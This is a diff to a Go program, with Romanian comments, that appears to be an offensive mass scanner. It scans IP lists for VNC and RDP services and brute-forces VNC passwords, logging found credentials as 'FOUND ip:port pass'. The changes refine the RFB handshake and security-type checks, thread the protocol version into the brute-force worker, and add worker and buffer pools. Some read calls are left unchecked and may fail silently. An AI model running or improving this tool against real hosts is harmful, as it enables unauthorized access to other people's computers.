@@ -58,6 +58,15 @@ var (
 	buttonSelected   = buttonStyle.Copy().BorderForeground(lipgloss.Color("#00ffea")).Background(lipgloss.Color("#222244")).Foreground(lipgloss.Color("#00ffea")).Blink(true)
 	buttonUnselected = buttonStyle.Copy().BorderForeground(lipgloss.Color("#444466")).Foreground(lipgloss.Color("#cccccc")).Background(lipgloss.Color("#111122"))
 	activeGoroutines int32
+	bufPool          = sync.Pool{
+		New: func() interface{} { return make([]byte, 12) },
+	}
+	filePool = sync.Pool{
+		New: func() interface{} {
+			f, _ := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+			return bufio.NewWriterSize(f, 4096) // buffer de 4KB
+		},
+	}
 )
 
 type scanStats struct {
@@ -584,7 +593,7 @@ func scanAndMaybeBrute(scanType string, brute bool) {
 						portWg.Add(1)
 						go func(port int) {
 							defer func() { <-portPool; portWg.Done() }()
-							banner, hasVNCAuth, hasVeNCrypt, version, err, flags := scanVNCHandshakeFull(ip, port, 10*time.Second, logf)
+							banner, hasVNCAuth, hasVeNCrypt, version, _, err, flags := scanVNCHandshakeFull(ip, port, 10*time.Second, logf)
 							if err != nil {
 								errStr := strings.ToLower(err.Error())
 								if strings.Contains(errStr, "connection refused") {
@@ -785,28 +794,22 @@ func isPortOpen(ip string, port int, timeout time.Duration) bool {
 }
 
 // Handshake complet VNC (cu fallback la ambele versiuni RFB)
-func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.File) (banner string, hasVNCAuth bool, hasVeNCrypt bool, version string, err error, flags string) {
-	address := fmt.Sprintf("%s:%d", ip, port)
-	conn, err := net.DialTimeout("tcp", address, timeout)
+func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.File) (banner string, hasVNCAuth bool, hasVeNCrypt bool, version string, secType byte, err error, flags string) {
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout)
 	if err != nil {
-		// Încearcă handshake SSL dacă handshake-ul clasic eșuează
-		conf := &tls.Config{InsecureSkipVerify: true}
-		tlsConn, sslErr := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", address, conf)
-		if sslErr == nil {
-			tlsConn.Close()
-			return "", false, false, "", nil, "" // SSL detected
-		}
-		return "", false, false, "", err, ""
+		return "", false, false, "", 0, err, ""
 	}
+	tcpConn := conn.(*net.TCPConn)
+	tcpConn.SetKeepAlive(true)
+	tcpConn.SetKeepAlivePeriod(30 * time.Second)
 	defer conn.Close()
-	conn.SetDeadline(time.Now().Add(timeout))
 
-	// 1. Citește bannerul RFB (12 bytes)
-	buf := make([]byte, 12)
+	buf := bufPool.Get().([]byte)
+	defer bufPool.Put(buf)
+
 	n, err := conn.Read(buf)
-	if err != nil || n < 12 || string(buf[:3]) != "RFB" {
-		logf.WriteString(fmt.Sprintf("%s:%d [BANNER?] %q\n", ip, port, buf[:n]))
-		return "", false, false, "", fmt.Errorf("not VNC or banner read error"), ""
+	if err != nil || n < 12 {
+		return "", false, false, "", 0, fmt.Errorf("banner read error"), ""
 	}
 	banner = string(buf[:n])
 	version = strings.TrimSpace(banner)
@@ -820,7 +823,7 @@ func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.F
 	if err != nil {
 		// Marchează ca [VNC UNKNOWN] și pune la found/output
 		flags := " [VNC UNKNOWN]"
-		return banner, false, false, version, nil, flags
+		return banner, false, false, version, 0, nil, flags
 	}
 	count := int(secTypeCount[0])
 	hasVNCAuth = false
@@ -831,7 +834,7 @@ func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.F
 		secTypes := make([]byte, count*2)
 		_, err = conn.Read(secTypes)
 		if err != nil {
-			return banner, false, false, version, fmt.Errorf("failed to read security types (2 bytes)"), ""
+			return banner, false, false, version, 0, fmt.Errorf("failed to read security types (2 bytes)"), ""
 		}
 		for i := 0; i < len(secTypes); i += 2 {
 			t := binary.BigEndian.Uint16(secTypes[i : i+2])
@@ -850,7 +853,7 @@ func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.F
 		secTypes := make([]byte, count)
 		_, err = conn.Read(secTypes)
 		if err != nil {
-			return banner, false, false, version, fmt.Errorf("failed to read security types (1 byte)"), ""
+			return banner, false, false, version, 0, fmt.Errorf("failed to read security types (1 byte)"), ""
 		}
 		for _, t := range secTypes {
 			switch t {
@@ -876,7 +879,13 @@ func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.F
 	if hasVNCConnect {
 		flags += " [VNC CONNECT]"
 	}
-	return banner, hasVNCAuth, hasVeNCrypt, version, nil, flags
+	// Returnează secType pentru a-l folosi în filtrare
+	if hasVNCAuth {
+		secType = 2
+	} else if hasVeNCrypt {
+		secType = 19
+	}
+	return banner, hasVNCAuth, hasVeNCrypt, version, secType, nil, flags
 }
 
 func scanRDP(ip string, wg *sync.WaitGroup, results chan<- string, progress, found, timeouts, errors chan<- int, timeout time.Duration) {
@@ -1238,9 +1247,11 @@ func readIPs(filename string) []ipPort {
 }
 
 type vncBruteJob struct {
-	IP   string
-	Port int
-	Pass string
+	IP      string
+	Port    int
+	Pass    string
+	Version string
+	UseSSL  bool
 }
 
 func vncBruteWorker(jobs <-chan vncBruteJob, results chan<- string, timeout time.Duration, statusCh chan<- vncBruteStatus, threads int, total int) {
@@ -1256,10 +1267,11 @@ func vncBruteWorker(jobs <-chan vncBruteJob, results chan<- string, timeout time
 	defer atomic.AddInt32(&activeGoroutines, -1)
 	logf, _ := os.OpenFile("output/wrong-pass.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer logf.Close()
+
 	for job := range jobs {
 		tried++
 		var logDetails string
-		res, logDetails, netErr := tryVNCLoginWithLogNet(job.IP, job.Port, job.Pass, timeout)
+		res, logDetails, netErr := tryVNCLoginWithVersionLogNet(job.IP, job.Port, job.Pass, timeout, job.Version, job.UseSSL)
 		switch res {
 		case VNC_OK:
 			results <- fmt.Sprintf("FOUND %s:%d %s", job.IP, job.Port, job.Pass)
@@ -1306,24 +1318,6 @@ func vncBruteWorker(jobs <-chan vncBruteJob, results chan<- string, timeout time
 	statusCh <- vncBruteStatus{Done: true}
 }
 
-func tryVNCLoginWithLogNet(ip string, port int, password string, timeout time.Duration) (VNCBruteResult, string, bool) {
-	versions := []string{"RFB 003.003\n", "RFB 003.007\n", "RFB 003.008\n", "RFB 005.000\n"}
-	for _, version := range versions {
-		res, logDetails, netErr := tryVNCLoginWithVersionLogNet(ip, port, password, timeout, version, false)
-		if res != VNC_PROTO_ERR {
-			return res, logDetails, netErr
-		}
-	}
-	for _, version := range versions {
-		res, logDetails, netErr := tryVNCLoginWithVersionLogNet(ip, port, password, timeout, version, true)
-		if res != VNC_PROTO_ERR {
-			return res, logDetails, netErr
-		}
-	}
-	return VNC_PROTO_ERR, "", false
-}
-
-// tryVNCLoginWithVersionLogNet: ca tryVNCLoginWithVersionLog, dar detectează network error
 func tryVNCLoginWithVersionLogNet(ip string, port int, password string, timeout time.Duration, version string, useSSL bool) (VNCBruteResult, string, bool) {
 	var conn net.Conn
 	var err error
@@ -1358,11 +1352,13 @@ func tryVNCLoginWithVersionLogNet(ip string, port int, password string, timeout 
 	}
 	conn.SetWriteDeadline(time.Now().Add(perStep))
 	conn.Write([]byte(version))
-	secType := make([]byte, 1)
-	conn.SetReadDeadline(time.Now().Add(perStep))
-	_, err = conn.Read(secType)
-	if err != nil || secType[0] != 2 {
-		return VNC_PROTO_ERR, "", false
+	secTypeCount := make([]byte, 1)
+	conn.Read(secTypeCount)
+	count := int(secTypeCount[0])
+	secTypes := make([]byte, count)
+	conn.Read(secTypes)
+	if !contains(secTypes, 2) {
+		return VNC_PROTO_ERR, "", false // Serverul nu acceptă VNC Auth
 	}
 	conn.SetWriteDeadline(time.Now().Add(perStep))
 	conn.Write([]byte{2})
@@ -1420,4 +1416,92 @@ func readPasswords(filename string) []string {
 		passwords = append(passwords, scanner.Text())
 	}
 	return passwords
+}
+
+func contains(types []byte, target byte) bool {
+	for _, t := range types {
+		if t == target {
+			return true
+		}
+	}
+	return false
+}
+
+func writeResults(results chan string) {
+	writer := filePool.Get().(*bufio.Writer)
+	defer func() {
+		writer.Flush()
+		filePool.Put(writer)
+	}()
+
+	for line := range results {
+		writer.WriteString(line + "\n")
+		if writer.Buffered() >= 4096 { // flush la fiecare 4KB
+			writer.Flush()
+		}
+	}
+}
+
+type Task struct {
+	IP   string
+	Port int
+}
+
+type WorkerPool struct {
+	tasks      chan Task
+	results    chan string
+	wg         sync.WaitGroup
+	maxWorkers int
+}
+
+func NewWorkerPool(maxWorkers, queueSize int) *WorkerPool {
+	return &WorkerPool{
+		tasks:      make(chan Task, queueSize),
+		results:    make(chan string, queueSize*2),
+		maxWorkers: maxWorkers,
+	}
+}
+
+func (wp *WorkerPool) Start() {
+	for i := 0; i < wp.maxWorkers; i++ {
+		wp.wg.Add(1)
+		go wp.worker()
+	}
+}
+
+func (wp *WorkerPool) worker() {
+	defer wp.wg.Done()
+	for task := range wp.tasks {
+		if task.Port == -1 { // Verifică semnalul de oprire
+			return
+		}
+		banner, _, _, _, _, _, _ := scanVNCHandshakeFull(task.IP, task.Port, 10*time.Second, nil)
+		wp.results <- fmt.Sprintf("%s:%d - %s", task.IP, task.Port, banner)
+	}
+}
+
+func (wp *WorkerPool) adjustWorkers() {
+	ticker := time.NewTicker(5 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		current := len(wp.tasks)
+		if current > cap(wp.tasks)/2 {
+			// Adaugă worker-i dacă coada e plină
+			wp.addWorker()
+		} else if current < cap(wp.tasks)/4 {
+			// Elimină worker-i inactivi
+			wp.removeWorker()
+		}
+	}
+}
+
+func (wp *WorkerPool) addWorker() {
+	wp.wg.Add(1)
+	go wp.worker()
+}
+
+func (wp *WorkerPool) removeWorker() {
+	// Trimite un task special pentru a închide worker-ul
+	wp.tasks <- Task{IP: "", Port: -1} // Semnal de oprire
 }
